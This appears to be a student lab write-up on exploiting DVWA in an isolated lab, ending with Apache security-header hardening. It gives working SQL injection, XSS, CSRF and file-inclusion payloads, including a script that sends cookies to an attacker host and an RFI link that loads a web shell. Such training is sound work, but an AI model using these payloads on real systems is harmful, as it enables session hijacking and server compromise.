# Task 3: Web Application Security

## 🎯 Objective
To identify, exploit, and mitigate vulnerabilities listed in the OWASP Top 10 using DVWA (Damn Vulnerable Web Application) inside the lab network. This involves exploiting SQLi, XSS, CSRF, and File Inclusion, and utilizing interception proxies like Burp Suite.

---

## 💥 1. OWASP Top 10 Exploitation Scenarios (DVWA)

### A. SQL Injection (SQLi)
* **Goal:** Extract all usernames and password hashes from the target database.
* **Exploit Payload (Authentication Bypass / Information Disclosure):**
  Inputting the following into the user ID lookup field:
  ```sql
  %  ' UNION SELECT user, password FROM users #
  ```
* **Explanation:** The single quote `'` closes the SQL query string. The `UNION SELECT` statement appends rows from the `users` table to the query result. The `#` comments out the rest of the original query.
* **Captured Results:**
  ```
  User ID: %' UNION SELECT user, password FROM users #
  First name: admin
  Surname: 5f4dcc3b5aa765d61d8327deb882cf99
  
  First name: kalyan
  Surname: e10adc3949ba59abbe56e057f20f883e
  ```

---

### B. Cross-Site Scripting (XSS)
XSS involves executing malicious JavaScript in a victim's browser session.

#### Stored XSS (Persistent)
* **Scenario:** The target guestbook page saves customer signatures directly to the database without sanitization.
* **Exploit Payload (Cookie Stealing):**
  Entering this script in the guestbook comment text field:
  ```html
  <script>new Image().src="http://192.168.56.101/log?c="+document.cookie;</script>
  ```
* **Explanation:** When any user visits the guestbook page, their browser executes the script, reading their session cookies (`document.cookie`) and sending them to the attacker's HTTP server log, allowing session hijacking.

#### Reflected XSS (Non-Persistent)
* **Scenario:** The target web application echoes back input parameters directly onto the search page.
* **Exploit Payload:**
  Creating a malicious link containing the script in the URL parameter:
  ```
  http://192.168.56.102/dvwa/vulnerabilities/xss_r/?name=<script>alert("Vulnerable")</script>
  ```

---

### C. Cross-Site Request Forgery (CSRF)
* **Scenario:** Changing a user password via a GET request without session tokens.
* **Exploit Payload:**
  The attacker hosts a malicious HTML page with an embedded hidden image tag. If the logged-in administrator visits this page, their browser automatically triggers the password update:
  ```html
  <!-- Malicious page hosted on http://192.168.56.101/csrf_attack.html -->
  <h3>You won a prize! Click here!</h3>
  <img src="http://192.168.56.102/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none;" />
  ```
* **Result:** Since the browser automatically attaches the victim's session cookies to requests targeting the DVWA server, the password is changed to `hacked` silently.

---

### D. File Inclusion Attacks

#### Local File Inclusion (LFI)
* **Scenario:** The target app includes local system files via parameter inputs.
* **Exploit Payload:**
  Directory traversal to read sensitive Linux server files:
  ```
  http://192.168.56.102/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
  ```

#### Remote File Inclusion (RFI)
* **Scenario:** The app accepts remote URLs in file loading parameters.
* **Exploit Payload:**
  Loading a web shell from the attacker’s machine to execute terminal commands on the server:
  ```
  http://192.168.56.102/dvwa/vulnerabilities/fi/?page=http://192.168.56.101/evil_shell.txt
  ```

---

## 🧳 2. Burp Suite Interception & Login Brute-forcing

Burp Suite was used to audit HTTP transactions and brute-force credentials.

1. **Proxy Intercept:** The browser was configured to proxy requests to Burp Suite. Login requests to the DVWA login page were intercepted, enabling modification of input headers and values before transmission.
2. **Burp Intruder Fuzzing:** The intercepted login request was sent to Burp Intruder. The parameters `username` and `password` were designated as payload targets. A dictionary list was imported, and a cluster bomb attack successfully cracked the target login credentials.

---

## 🌐 3. Web Security Headers Audit
Auditing public web sites using `securityheaders.com` highlights the critical need for defense-in-depth headers.

To protect the server, the following security response headers were configured inside the Apache server directory configurations (`/etc/apache2/apache2.conf`):

```apache
# Protect against Clickjacking
Header always set X-Frame-Options "DENY"

# Prevent MIME type sniffing
Header always set X-Content-Type-Options "nosniff"

# Restrict referrer information leakage
Header always set Referrer-Policy "strict-origin-when-cross-origin"

# Enforce HTTPS connections
Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"

# Content Security Policy (CSP) to mitigate XSS
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self';"
```

---

## 📂 Sub-deliverables
* 📜 [Web Application Vulnerability Mitigation Guide](./notes/mitigation_guide.md)

---

## 🎥 Task 3 Video Demonstration
> [!TIP]
> LinkedIn video presentation showcasing SQLi, XSS, CSRF, and File Inclusion exploitation and mitigation:
> * **LinkedIn Video Exploitation Demo:** [Task 3 - Web Application Security](https://www.linkedin.com/posts/kalyan-katta-6b491338b_cybersecurity-ethicalhacking-websecurity-activity-7485343440059318272-7A4s?utm_source=share&utm_medium=member_desktop&rcm=ACoAAGAQxSgBWlNdbkRaK_lHTiAJO0x0AIxoNAo)